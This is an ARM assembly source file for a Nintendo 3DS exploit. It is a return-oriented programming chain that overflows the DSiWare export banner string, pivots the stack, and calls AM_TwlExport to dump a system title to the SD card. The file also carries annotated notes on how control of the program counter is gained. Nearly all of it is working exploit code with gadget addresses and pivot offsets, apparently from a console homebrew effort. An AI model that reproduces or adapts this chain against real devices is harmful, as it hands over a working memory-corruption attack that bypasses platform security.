	.arm
	.text

#include "rop_gadgets.h"

	.global	_start
@--------------------------------------------------------------------------------- ROP chain payload ( AM_TwlExport() )
_start:				
	@ Starts at stack address 0x0ffffe48, size 0x100. This is the DSiWare export banner title string that will crash the stack at string + 0xEC.
	@ Different languages load different string offsets in the banner, but they all get moved to the same address: 0x0ffffe48.	
	@ The exploit code that pivots to this payload is further down at "Exploit Gadgets begin"
	
	.word POP_R0PC				@ ------------ Write null to end of DSiWare export string.
		.word null_addr			@ 	Dest address of null char
	.word ROP_MOV_R1_0			@ 
		.word GARBAGE			@ 	r4
	.word ROP_STR_R12R0			@ 
		.word GARBAGE			@ 	r4
	.word POP_R0PC				@ ------------ Begin filling in args for AM_TwlExport. This is a nice wrapper function for AM_ExportTwlBackup().
		.word INT			@ 	Tidlow of DS Internet
	.word POP_R1PC				@ 
		.word TID_H			@ 	Tidhigh of system dsiware
	.word POP_R2PC				@ 	
		.word dsINT			@ 	Address of export's string (below)
	.word POP_R3PC				@ 
		.word WBUFF			@ 	128KB workbuff supplied to AM_TwlExport
	.word AM_TwlExport			@   	AM_TwlExport(u32 tidlow, u32 tidhigh, char *export_path, *wbuff)
		.word GARBAGE			@	r4
		.word GARBAGE			@	r5
		.word GARBAGE			@	r6
		.word GARBAGE			@	r7
	.word ROP_MOV_R3_4_JUNKTOR0		@ ------------ Color the screen so users know something good is happening 
		.word GARBAGE			@ 	r4
		.word GARBAGE	    		@ 	r5
		.word GARBAGE	    		@ 	r6
		.word GARBAGE	    		@ 	r7
		.word GARBAGE	    		@ 	r8
	.word POP_R0PC          		@
		.word GSPGPU_SERVHANDLEADR	@ 	GSGPU Handle already present in memory
	.word POP_R1PC				@
		.word HWREGS_ADDR      		@ 	Register address for bottom screen coloring
	.word POP_R2PC          		@
		.word MAGENTA_ADDR  		@	Existing location of magenta color 
	.word GSPGPU_WriteHWRegs		@   	GSPGPU_WriteHWRegs(&GSPHandle, HwRegsAddress, &MagentaAddr, size=4)
		.word GARBAGE	    		@ 	r4
		.word GARBAGE	    		@ 	r5
		.word GARBAGE			@ 	r6	
	.word ROP_MOV_R1_0			@ ------------ Wait a little bit to make sure export completes before the crash
		.word GARBAGE			@	r4
	.word POP_R0PC				@
		.word 0xFFFFFFFF		@	r0 ... r1 is zeroed above
	.word svcSleepThread			@   	svcSleepThread(u64 0x00000000FFFFFFFF) this is about 4 seconds.
		
	
		
dsINT: // this is "sdmc:/42383841.bin" wchar in ascii.  I had to do it this way to avoid a wchar null at the end
	.ascii "s\0","d\0","m\0","c\0",":\0","/\0","4\0","2\0","3\0","8\0","3\0","8\0","4\0","1\0",".\0","b\0","i\0","n\0" 
null_addr:

@--------------------------------------------------------------------------------- Padding
	
	.fill	((_start + 0xE0 - null_addr)/4),4, GARBAGE

@--------------------------------------------------------------------------------- Exploit gadgets begin
							@ (x) x = The order of execution of the following gadgets
	.word STACK_PIVOT				@ (7) Pivots stack to ROP chain payload above
	.word ROP_MOV_R3_R6_BLX_ADDRR5			@ (4) Custom r3 (PIVOT_OFFSET) setup gadget for (7)
	.word 0x0FFFFF40				@ (2) Points to (3)
	.word 0x0FFFFEEC				@ (1) r4 ENTRYPOINT - this + 0x44 points to (2)
	.word 0x0FFFFF28				@ (5) r5 Pointer to STACK_PIVOT 
	.word PIVOT_OFFSET				@ (6) r6 (later r3) The payload location is just 0x110 behind the current SP
	.word 0x0FFFFF1C				@ (3) r7 This + 0x10 points to (4)
	.word GARBAGE					@ (-) r8 This is half-nulled by Mset so useless
	
@--------------------------------------------------------------------------------- End
@---------------------------------------------------------------------------------
@---------------------------------------------------------------------------------




@--------------------------------------------------------------------------------- Notes

/*  NOTES on the exploit gadget section
		;from the string overflow, we control r4-r7. r4 is especially important
		
		STRB		R0, [R4,#0x68] ;entrypoint - first crash was here since r4 was fuzzed - this write is further up the stack and is don't care
		LDR		R0, [R4,#0x54] '' -------------------------------------------
		MOV		R1, #2         '' *(0x0FFFFF1C + 0x4C) = 2, this is harmless
		STR		R1, [R0,#0x4C] '' -------------------------------------------
		
		B		loc_20DA10
		...						;obviously skipped what was jumped over
	loc_20DA10:                    
		
		LDR		R0, [R4,#0x44] '' -------------------------------------------
		MOV		R1, #1         '' *(0x0FFFFF40 + 0x18) = 1, also harmless
		STR		R1, [R0,#0x18] '' -------------------------------------------
		
		
		;this is where things really start
		
		LDR		R0, [R4,#0x44] ;r0 = 0x0FFFFF40
		LDR		R1, [R0]       ;r1 = 0x0FFFFF1C
		LDR		R1, [R1,#0x10] ;r1 = 0x001264AC (code!)
		BLX		R1			   ;jump to r1, got PC! - in this next custom gadget (0x001264AC), we need to get the r3 control that our stack pivot needs, AND find a way to keep PC.
							   ;continue below for details on that
*/


/*  Gadget 0x001264AC 
		;In summary,
		;MOV r12,nextgadget ; MOV r3,r6 ; b r12 --- Perfect!

		LDR		R12, [R5] //r5 contains the pointer to the stack pivot gadget address
		CMP		R12, #0
		BEQ		loc_1264CC  ;false
		MOV		R3, R6
		MOV		R2, #0      ;these 3 assignments are don't care
		MOV		R1, #0x100
		MOV		R0, #0x10000
		BLX		R12 
		
		;With PC and SP under our control, we now have a rop chain going!


*/

@ How does Link get back home after his adventures? (A Link Register)